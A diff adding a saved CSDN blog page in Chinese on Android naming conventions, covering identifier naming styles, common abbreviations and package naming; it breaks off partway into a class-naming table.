@@ -1,0 +1,2331 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+     
+    <html xmlns="http://www.w3.org/1999/xhtml">
+    
+<head>  
+
+    <script type="text/javascript" src="http://c.csdnimg.cn/pubfooter/js/tracking.js" charset="utf-8"></script>  
+
+    <script type="text/javascript">
+        var protocol = window.location.protocol;
+        document.write('<script type="text/javascript" src="' + protocol + '//csdnimg.cn/pubfooter/js/repoAddr2.js?v=' + Math.random() + '"></' + 'script>');
+    </script>
+
+  
+ <meta http-equiv="Cache-Control" content="no-siteapp" /><link rel="alternate" media="handheld" href="#" />
+
+    <title>Android 命名规范 （提高代码可以读性） - 未来之路 的专栏
+        - 博客频道 - CSDN.NET</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="description" content="刚接触android的时候，命名都是按照拼音来，" />
+    <script src="http://static.blog.csdn.net/scripts/jquery.js" type="text/javascript"></script>
+      <script type="text/javascript" src="http://static.blog.csdn.net/scripts/jquery-version.js"></script>
+    <script type="text/javascript" src="http://static.blog.csdn.net/scripts/ad.js?v=1.1"></script>
+        <!--new top-->
+               <link rel="stylesheet" href="http://c.csdnimg.cn/public/common/toolbar/css/index.css">        <!--new top-->
+    
+      <!-- ad begin -->
+         <script language="javascript" type="text/javascript" src="http://ads.csdn.net/js/tracking.js"></script>
+    <!-- ad end-->
+
+    <link rel="Stylesheet" type="text/css" href="http://static.blog.csdn.net/skin/light_blue/css/style.css?v=1.1" />
+    <link id="RSSLink" title="RSS" type="application/rss+xml" rel="alternate" href="/vipzjyno1/rss/list" />
+    <link rel="shortcut icon" href="http://c.csdnimg.cn/public/favicon.ico" />
+    <link type="text/css" rel="stylesheet" href="http://static.blog.csdn.net/scripts/SyntaxHighlighter/styles/default.css" />
+ 
+
+
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "//hm.baidu.com/hm.js?6bcd52f51e9b3dce32bec4a3997715ac";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+</head>
+<body>
+
+
+    <!-- 广告位开始 -->
+        <ins data-revive-zoneid="149" data-revive-id="8c38e720de1c90a6f6ff52f3f89c4d57"></ins>
+    <!-- 广告位结束 -->
+
+    
+   
+      <!--new top-->
+    <script id="toolbar-tpl-scriptId" fixed="true" prod="blog" skin="black" src="http://c.csdnimg.cn/public/common/toolbar/js/html.js" type="text/javascript"></script>
+     <!--new top-->
+    <div id="container">
+        <div id="header">
+    <div class="header">
+        <div id="blog_title">
+            <h2>
+                <a href="http://blog.csdn.net/vipzjyno1">未来之路 的专栏</a></h2>
+            <h3>只要你做的够好, 终有一天, 你会发现你得到的远比失去的要多.</h3>
+            <div class="clear">
+            </div>
+        </div>
+        <div class="clear">
+        </div>
+        
+     
+    </div>
+</div>
+<div id="navigator">
+    <div class="navigator_bg">
+    </div>
+    <div class="navigator">
+        <ul>           
+                <li id="btnContents"><a href="http://blog.csdn.net/vipzjyno1?viewmode=contents"><span onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_mulu'])">
+                    <img src="http://static.blog.csdn.net/images/ico_list.gif">目录视图</span></a></li>
+                <li id="btnView"><a href="http://blog.csdn.net/vipzjyno1?viewmode=list"><span onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_zhaiyao'])">
+                    <img src="http://static.blog.csdn.net/images/ico_summary.gif">摘要视图</span></a></li>
+                <li id="btnRss"><a href="http://blog.csdn.net/vipzjyno1/rss/list"><span onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_RSS'])">
+                    <img src="http://static.blog.csdn.net/images/ico_rss.gif">订阅</span></a></li>                
+            
+
+            </ul>
+    </div>
+</div>
+<script type="text/javascript">
+    var username = "vipzjyno1";
+    var _blogger = username;
+    var blog_address = "http://blog.csdn.net/vipzjyno1";
+    var static_host = "http://static.blog.csdn.net";
+    var currentUserName = "";  
+</script>
+
+        <div id="body">
+            <div id="main">
+                <div class="main">
+                        <div class="ad_class">
+<div class="notice tracking-ad" data-mod='popu_3' > 
+
+
+<a href="http://blog.csdn.net/blogdevteam/article/details/60960431">
+<font color=red> CSDN日报20170309——《程序员，杂草和大树，你选哪个》</font></a>
+
+&nbsp;&nbsp;&nbsp;&nbsp
+
+<a href="http://blog.csdn.net/turingbooks/article/details/58072986">
+<font color=blue>程序员2月书讯
+</font></a>
+
+&nbsp;&nbsp;&nbsp;
+
+<a href="http://edu.csdn.net/huiyiCourse/detail/284?ref=blog&loc=r3">
+<font color=red>【直播】用面向协议的思想简化网络请求
+</font></a>
+&nbsp;&nbsp;&nbsp;
+
+<a href="http://blog.csdn.net/blogdevteam/article/details/60961185">
+<font color=blue>博客一键搬家活动开始啦
+</font></a>
+
+</div>                        </div>
+                        
+
+
+
+  
+<link href="http://static.blog.csdn.net/css/comment1.css" type="text/css" rel="stylesheet" />
+<link href="http://static.blog.csdn.net/css/style1.css" type="text/css" rel="stylesheet" />
+<script language='JavaScript' type='text/javascript' src='http://download.csdn.net/js/jquery.cookie.js'></script>
+<script type="text/javascript" src="http://c.csdnimg.cn/rabbit/search-service/main.js"></script>
+<link rel="stylesheet" href="http://static.blog.csdn.net/public/res-min/markdown_views.css?v=1.0" />
+<link rel="stylesheet" href="http://static.blog.csdn.net/css/category.css?v=1.0" />
+<script type="text/javascript" src="http://static.blog.csdn.net/public/res/bower-libs/MathJax/MathJax.js?config=TeX-AMS_HTML"></script>
+<script type="text/javascript" src="http://static.blog.csdn.net/scripts/web-storage-cache.min.js"></script>
+<script type="text/javascript" src="http://static.blog.csdn.net/scripts/replace.min.js"></script>
+
+
+
+
+  <script type="text/ecmascript">
+      window.quickReplyflag = true;
+           
+            var isBole = false;
+            
+      
+      var fasrc="http://my.csdn.net/my/favorite/miniadd?t=Android+%e5%91%bd%e5%90%8d%e8%a7%84%e8%8c%83+%ef%bc%88%e6%8f%90%e9%ab%98%e4%bb%a3%e7%a0%81%e5%8f%af%e4%bb%a5%e8%af%bb%e6%80%a7%ef%bc%89&u=http://blog.csdn.net/vipzjyno1/article/details/23542617"
+
+    </script>
+<div id="article_details" class="details">
+    <div class="article_title">   
+         <span class="ico ico_type_Original"></span>
+
+
+    <h1>
+        <span class="link_title"><a href="/vipzjyno1/article/details/23542617">
+        <font color="red">[置顶]</font>
+        Android 命名规范 （提高代码可以读性）            
+        </a></span>
+    </h1>
+</div>
+
+   
+
+        <div class="article_manage clearfix">
+        <div class="article_l">
+            <span class="link_categories">
+            标签：
+              <a href='http://www.csdn.net/tag/Android' target=_blank onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_tag']);">Android</a><a href='http://www.csdn.net/tag/%e5%91%bd%e5%90%8d' target=_blank onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_tag']);">命名</a><a href='http://www.csdn.net/tag/%e8%a7%84%e8%8c%83' target=_blank onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_tag']);">规范</a><a href='http://www.csdn.net/tag/%e7%bc%96%e7%a0%81' target=_blank onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_tag']);">编码</a><a href='http://www.csdn.net/tag/%e4%b9%a0%e6%83%af' target=_blank onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_tag']);">习惯</a>
+            </span>
+        </div>
+        <div class="article_r">
+            <span class="link_postdate">2014-04-12 22:48</span>
+            <span class="link_view" title="阅读次数">88476人阅读</span>
+            <span class="link_comments" title="评论次数"> <a href="#comments" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_pinglun'])">评论</a>(31)</span>
+            <span class="link_collect tracking-ad" data-mod="popu_171"> <a href="javascript:void(0);" onclick="javascript:collectArticle('Android+%e5%91%bd%e5%90%8d%e8%a7%84%e8%8c%83+%ef%bc%88%e6%8f%90%e9%ab%98%e4%bb%a3%e7%a0%81%e5%8f%af%e4%bb%a5%e8%af%bb%e6%80%a7%ef%bc%89','23542617');return false;" title="收藏">收藏</a></span>
+             <span class="link_report"> <a href="#report" onclick="javascript:report(23542617,2);return false;" title="举报">举报</a></span>
+
+        </div>
+    </div>
+    <div class="embody"  style="display:none" id="embody">
+        <span class="embody_t">本文章已收录于：</span>
+        <div class="embody_c" id="lib" value="{&quot;err&quot;:0,&quot;msg&quot;:&quot;ok&quot;,&quot;data&quot;:[]}"></div>
+    </div>
+    <style type="text/css">        
+            .embody{
+                padding:10px 10px 10px;
+                margin:0 -20px;
+                border-bottom:solid 1px #ededed;                
+            }
+            .embody_b{
+                margin:0 ;
+                padding:10px 0;
+            }
+            .embody .embody_t,.embody .embody_c{
+                display: inline-block;
+                margin-right:10px;
+            }
+            .embody_t{
+                font-size: 12px;
+                color:#999;
+            }
+            .embody_c{
+                font-size: 12px;
+            }
+            .embody_c img,.embody_c em{
+                display: inline-block;
+                vertical-align: middle;               
+            }
+             .embody_c img{               
+                width:30px;
+                height:30px;
+            }
+            .embody_c em{
+                margin: 0 20px 0 10px;
+                color:#333;
+                font-style: normal;
+            }
+    </style>
+    <script  type="text/javascript">
+        $(function () {
+            try
+            {
+                var lib = eval("("+$("#lib").attr("value")+")");
+                var html = "";
+                if (lib.err == 0) {
+                    $.each(lib.data, function (i) {
+                        var obj = lib.data[i];
+                        //html += '<img src="' + obj.logo + '"/>' + obj.name + "&nbsp;&nbsp;";
+                        html += ' <a href="' + obj.url + '" target="_blank">';
+                        html += ' <img src="' + obj.logo + '">';
+                        html += ' <em><b>' + obj.name + '</b></em>';
+                        html += ' </a>';
+                    });
+                    if (html != "") {
+                        setTimeout(function () {
+                            $("#lib").html(html);                      
+                            $("#embody").show();
+                        }, 100);
+                    }
+                }      
+            } catch (err)
+            { }
+            
+        });
+    </script>
+      <div class="category clearfix">
+        <div class="category_l">
+           <img src="http://static.blog.csdn.net/images/category_icon.jpg">
+            <span>分类：</span>
+        </div>
+        <div class="category_r">
+                    <label  onclick="GetCategoryArticles('2050837','vipzjyno1','top','23542617');">
+                        <span onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_fenlei']);">android<em>（19）</em></span>
+                      <img class="arrow-down" src="http://static.blog.csdn.net/images/arrow_triangle _down.jpg" style="display:inline;">
+                      <img class="arrow-up" src="http://static.blog.csdn.net/images/arrow_triangle_up.jpg" style="display:none;">
+                        <div class="subItem">
+                            <div class="subItem_t"><a  href="http://blog.csdn.net/vipzjyno1/article/category/2050837"  target="_blank">作者同类文章</a><i class="J_close">X</i></div>
+                            <ul class="subItem_l" id="top_2050837">                            
+                            </ul>
+                        </div>
+                    </label>                    
+        </div>
+    </div>
+    <script   type="text/javascript" src="http://static.blog.csdn.net/scripts/category.js"></script>  
+        <div   class="bog_copyright">         
+            <p  class="copyright_p" >版权声明：本文为博主原创文章，未经博主允许不得转载。</p>
+        </div>
+
+  
+
+  
+  
+     
+
+<div id="article_content" class="article_content">
+
+<p><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp;刚接触android的时候，命名都是按照拼音来，所以有的时候想看懂命名的那个控件什么是什么用的，就要读一遍甚至好几遍才知道，这样的话，在代码的审查和修改过程中就会浪费不少不必要的时间。如果就是我一个人开发，一个人维护的话还好，可是如果一个项目是团队分工合作，这样让你的同事去看你的代码就更加吃力了，因为大家之间的编程方式不一样，所以，在开发过程中，命名规范统一尤为重要，最好是团队中统一好大家命名方法，这样对于日后的工作会轻松很多。</span></p>
+<p><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp;在面试的时候，审核一个程序员的编程水平的时候，命名规范也是一大标准，所以，下面我就总结下我从网上别人的经验和自己的感悟中收集总结的android命名规范，希望对大家有所帮助。</span></p>
+<p><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp;提醒：在命名规范的统一下，在加上注释，这样日后维护会高效快捷好多。</span></p>
+<p><br>
+</p>
+<p><span style="color:#464646; background:#F8F8F8">先初略介绍下当前主要的标识符命名法和英文缩写规则：（这段别人那边借鉴的）</span><br>
+</p>
+<p><span style="color:#464646; background:#F8F8F8"></span></p>
+<p align="left"><span style="color:#464646; background:#F8F8F8">在讲解命名规范前，先初略介绍下当前主要的标识符命名法和英文缩写规则。</span><span style="color:#464646"><br>
+<strong><span style="background:#F8F8F8"><br>
+</span></strong></span><strong><span style="color:#464646; background:#F8F8F8">标识符命名法</span></strong><span style="color:#464646"><br>
+</span><span style="color:#464646; background:#F8F8F8">标识符命名法最要有四种</span><span style="color:#464646; background:#F8F8F8">:</span><span style="color:#464646"><br>
+<br>
+<span style="background:#F8F8F8">1 </span></span><span style="color:#464646; background:#F8F8F8">驼峰</span><span style="color:#464646; background:#F8F8F8">(Camel)</span><span style="color:#464646; background:#F8F8F8">命名法</span><span style="color:#464646; background:#F8F8F8">:</span><span style="color:#464646; background:#F8F8F8">又称小驼峰命名法，除首单词外，其余所有单词的第一个字母大写。</span><span style="color:#464646"><br>
+<br>
+<span style="background:#F8F8F8">2 </span></span><span style="color:#464646; background:#F8F8F8">帕斯卡</span><span style="color:#464646; background:#F8F8F8">(pascal)</span><span style="color:#464646; background:#F8F8F8">命名法</span><span style="color:#464646; background:#F8F8F8">:</span><span style="color:#464646; background:#F8F8F8">又称大驼峰命名法，所有单词的第一个字母大写</span><span style="color:#464646"><br>
+<br>
+<span style="background:#F8F8F8">3 </span></span><span style="color:#464646; background:#F8F8F8">下划线命名法</span><span style="color:#464646; background:#F8F8F8">:</span><span style="color:#464646; background:#F8F8F8">单词与单词间用下划线做间隔。</span><span style="color:#464646"><br>
+<br>
+<span style="background:#F8F8F8">4 </span></span><span style="color:#464646; background:#F8F8F8">匈牙利命名法</span><span style="color:#464646; background:#F8F8F8">:</span><span style="color:#464646; background:#F8F8F8">广泛应用于微软编程环境中，在以</span><span style="color:#464646; background:#F8F8F8">Pascal</span><span style="color:#464646; background:#F8F8F8">命名法的变量前附加小写序列说明该变量的类型。</span><span style="color:#464646">&nbsp;</span><span style="color:#464646; background:#F8F8F8">量的取名方式为：</span><span style="color:#464646; background:#F8F8F8">&lt;scope_&gt;&nbsp;&#43;&nbsp;&lt;prefix_&gt;&nbsp;&#43;&nbsp;&lt;qualifier&gt;</span><span style="color:#464646; background:#F8F8F8">范围前缀，类型前缀，限定词。</span><span style="color:#464646"><br>
+<br>
+</span><span style="color:#464646; background:#F8F8F8">个人觉得标识符命名原则</span><span style="color:#464646; background:#F8F8F8">:</span><strong><span style="color:#464646; background:#F8F8F8">尽可能的用最少的字符而又能完整的表达标识符的含义。</span></strong><span style="color:#464646"><br>
+<br>
+</span><span style="color:#464646; background:#F8F8F8">英文缩写原则：</span><span style="color:#464646"><br>
+<span style="background:#F8F8F8">1 </span></span><span style="color:#464646; background:#F8F8F8">较短的单词可通过去掉</span><span style="color:#464646; background:#F8F8F8">“</span><span style="color:#464646; background:#F8F8F8">元音</span><span style="color:#464646; background:#F8F8F8">”</span><span style="color:#464646; background:#F8F8F8">形成缩写</span><span style="color:#464646"><br>
+<span style="background:#F8F8F8">2 </span></span><span style="color:#464646; background:#F8F8F8">较长的单词可取单词的头几个字母形成缩写</span><span style="color:#464646"><br>
+<span style="background:#F8F8F8">3 </span></span><span style="color:#464646; background:#F8F8F8">此外还有一些约定成俗的英文单词缩写</span><span style="color:#464646; background:#F8F8F8">.</span><span style="color:#464646"><br>
+<br>
+</span><span style="color:#464646; background:#F8F8F8">下面为常见的英文单词缩写</span><span style="color:#464646; background:#F8F8F8">:</span></p>
+<table border="1" cellspacing="0" cellpadding="0" width="493">
+<tbody>
+<tr>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">名称</span></strong></p>
+</td>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">缩写</span></strong></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#333333; background:#F8F8F8">icon &nbsp;</span></p>
+</td>
+<td>
+<p><span style="color:#333333">ic&nbsp;</span><span style="color:#333333">（主要用在</span><span style="color:rgb(51,51,51)">app</span><span style="color:rgb(51,51,51)">的图标</span><span style="color:#333333">）</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#333333">color &nbsp;</span></p>
+</td>
+<td>
+<p><span style="color:#333333">cl</span><span style="color:#333333">（</span><span style="color:rgb(51,51,51)">主要用于颜色&#20540;</span><span style="color:#333333">）</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#333333">divider</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#333333">di</span><span style="color:#333333">（</span><span style="color:rgb(51,51,51)">主要用于分隔线，不仅包括</span><span style="color:rgb(51,51,51)">Listview</span><span style="color:rgb(51,51,51)">中的</span><span style="color:rgb(51,51,51)">divider</span><span style="color:rgb(51,51,51)">，还包括普通布局中的线</span><span style="color:#333333">）</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#333333">selector</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#333333">sl</span><span style="color:#333333">（</span><span style="color:rgb(51,51,51)">主要用于某一</span><span style="color:rgb(51,51,51)">view</span><span style="color:rgb(51,51,51)">多种状态，不仅包括</span><span style="color:rgb(51,51,51)">Listview</span><span style="color:rgb(51,51,51)">中的</span><span style="color:rgb(51,51,51)">selector</span><span style="color:rgb(51,51,51)">，还包括按钮的</span><span style="color:rgb(51,51,51)">selector</span><span style="color:#333333">）</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">average</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">avg</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">background&nbsp;</span><span style="color:#464646">&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">Bg</span><span style="color:#464646; background:#F8F8F8">（</span><span style="color:rgb(51,51,51)">主要用于布局和子布局的背景</span><span style="color:#464646; background:#F8F8F8">）</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">buffer</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">buf</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">control</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">ctrl</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">delete</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">del</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">document&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">doc</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">error</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">err</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">escape</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">esc</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">increment</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">inc</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">infomation</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">info</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">initial&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">init</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">image</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">img</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">Internationalization</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">I18N</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">length</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">len</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">library</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">lib</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">message</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">msg</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">password-</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">pwd</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">position</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">pos</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">server</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">srv</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">string</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">str</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">temp</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">tmp</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">window</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">wnd(win)</span></p>
+</td>
+</tr>
+</tbody>
+</table>
+<p align="left"><span style="color:#464646"><br>
+</span><span style="color:#464646; background:#F8F8F8">程序中使用单词缩写原则：<strong>不要用缩写，除非该缩写是约定俗成的。</strong></span></p>
+<p align="left"><span style="color:#464646"><br>
+</span><span style="color:#464646; background:#F8F8F8"><span style="font-size:24px">命名规范：</span></span><span style="color:#464646"><br>
+<br>
+<span style="background:#F8F8F8">1 &nbsp;</span></span><span style="color:#464646; background:#F8F8F8">包（</span><span style="color:#464646; background:#F8F8F8">packages</span><span style="color:#464646; background:#F8F8F8">）</span><span style="color:#464646; background:#F8F8F8">:&nbsp;</span><span style="color:#464646; background:#F8F8F8">采用反域名命名规则，全部使用小写字母。一级包名为</span><span style="color:#464646; background:#F8F8F8">com</span><span style="color:#464646; background:#F8F8F8">，二</span><span style="color:#464646; background:#F8F8F8">级包名为</span><span style="color:#464646; background:#F8F8F8">xx（可以是公司或则个人的随便）</span><span style="color:#464646; background:#F8F8F8">，三级包名根据应用进行命名，四级包名为模块名或层级名</span><br>
+<br>
+<table border="1" cellspacing="0" cellpadding="0" width="493">
+<tbody>
+<tr>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">包名</span></strong></p>
+</td>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">此包中包含</span></strong></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">com.xx.</span><span style="color:#464646; background:#F8F8F8">应用名称缩写</span><span style="color:#464646; background:#F8F8F8">.activities</span></p>
+</td>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">&nbsp;页面用到的</span><span style="color:#464646; background:#F8F8F8">Activity</span><span style="color:#464646; background:#F8F8F8">类</span><span style="color:#464646; background:#F8F8F8">&nbsp;</span><span style="color:#464646; background:#F8F8F8">(activities</span><span style="color:#464646; background:#F8F8F8">层级名</span>用户界面层<span style="color:#464646; background:#F8F8F8">)</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;</span>com.xx.<span style="color:#464646; background:#F8F8F8">应用名称缩写</span><span style="color:#464646; background:#F8F8F8">.base</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;页面中每个</span><span style="color:#464646; background:#F8F8F8">Activity</span><span style="color:#464646; background:#F8F8F8">类共享的可以写成一个</span><span style="color:#464646; background:#F8F8F8">i</span><span style="color:#464646; background:#F8F8F8">额</span><span style="color:#464646; background:#F8F8F8">BaseActivity</span><span style="color:#464646; background:#F8F8F8">类</span><span style="color:#464646; background:#F8F8F8">&nbsp;(</span><span style="color:#464646; background:#F8F8F8">基础共享的类</span><span style="color:#464646; background:#F8F8F8">)</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">com.xx.</span><span style="color:#464646; background:#F8F8F8">应用名称缩写</span><span style="color:#464646; background:#F8F8F8">.adapter &nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;页面用到的</span><span style="color:#464646; background:#F8F8F8">Ad</span><span style="background-color:rgb(255,255,255)"><span style="color:rgb(70,70,70)">apter</span><span style="color:rgb(70,70,70)">类</span><span style="color:rgb(70,70,70)">&nbsp;(</span><span style="color:rgb(70,70,70)">适</span></span><span style="color:#464646; background:#F8F8F8">配器的类</span><span style="color:#464646; background:#F8F8F8">)</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">com.xx.</span><span style="color:#464646; background:#F8F8F8">应用名称缩写</span><span style="color:#464646; background:#F8F8F8">.tools</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;此包中包含：公共工具方法类</span>（<span style="color:#464646; background:#F8F8F8">tools</span><span style="color:#464646; background:#F8F8F8">模块名）</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">com.xx.</span><span style="color:#464646; background:#F8F8F8">应用名称缩写</span><span style="color:#464646; background:#F8F8F8">.bean</span></p>
+<p align="left"><span style="color:#464646; background:#F8F8F8">(</span><span style="color:#464646; background:#F8F8F8">或则</span><span style="color:#464646; background:#F8F8F8">&nbsp;com.xx.</span><span style="color:#464646; background:#F8F8F8">应用名称缩写</span><span style="color:#464646; background:#F8F8F8">.unity&nbsp;)</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;此包中包含：元素类</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">com.xx.</span><span style="color:#464646; background:#F8F8F8">应用名称缩写</span><span style="color:#464646; background:#F8F8F8">.db</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;数据库操作类</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">com.xx.</span><span style="color:#464646; background:#F8F8F8">应用名称缩写</span><span style="color:#464646; background:#F8F8F8">.view</span></p>
+<p align="left"><span style="color:#464646; background:#F8F8F8">(</span><span style="color:#464646; background:#F8F8F8">或则</span><span style="color:#464646; background:#F8F8F8">&nbsp;com.xx.</span><span style="color:#464646; background:#F8F8F8">应用名称缩写</span><span style="color:#464646; background:#F8F8F8">.ui&nbsp;)</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;自定义的</span><span style="color:#464646; background:#F8F8F8">View</span><span style="color:#464646; background:#F8F8F8">类等</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">com.xx.</span><span style="color:#464646; background:#F8F8F8">应用名称缩写</span><span style="color:#464646; background:#F8F8F8">.service &nbsp;&nbsp;</span><span style="color:#464646">&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;Service</span><span style="color:#464646; background:#F8F8F8">服务</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><span style="color:#464646; background:#F8F8F8">com.xx.</span><span style="color:#464646; background:#F8F8F8">应用名称缩写</span><span style="color:#464646; background:#F8F8F8">.broadcast &nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:#464646; background:#F8F8F8">&nbsp;Broadcast</span><span style="color:#464646; background:#F8F8F8">服务</span></p>
+</td>
+</tr>
+</tbody>
+</table>
+<span style="color:#464646; background:#F8F8F8"></span><span style="color:#464646"><br>
+</span></p>
+<p align="left"><span style="color:#464646"><br>
+<span style="background:#F8F8F8">2 &nbsp;</span></span><span style="color:#464646; background:#F8F8F8">类（</span><span style="color:#464646; background:#F8F8F8">classes</span><span style="color:#464646; background:#F8F8F8">）：名词，采用大驼峰命名法，尽量避免缩写，除非该缩写是众所周知的，</span><span style="color:#464646"><span style="background:#F8F8F8">&nbsp;</span></span><span style="color:#464646">&nbsp;</span><span style="color:#464646; background:#F8F8F8">比如</span><span style="color:#464646; background:#F8F8F8">HTML,URL</span><span style="color:#464646; background:#F8F8F8">，如果类名称中包含单词缩写，则单词缩写的每个字母均应大写。</span><span style="color:#464646"><br>
+<br>
+</span>
+<table border="1" cellspacing="0" cellpadding="0" width="553">
+<tbody>
+<tr>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">类</span></strong></p>
+</td>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">描述</span></strong></p>
+</td>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">例如</span></strong></p>
+</td>
+</tr>
+<tr>
+<td>
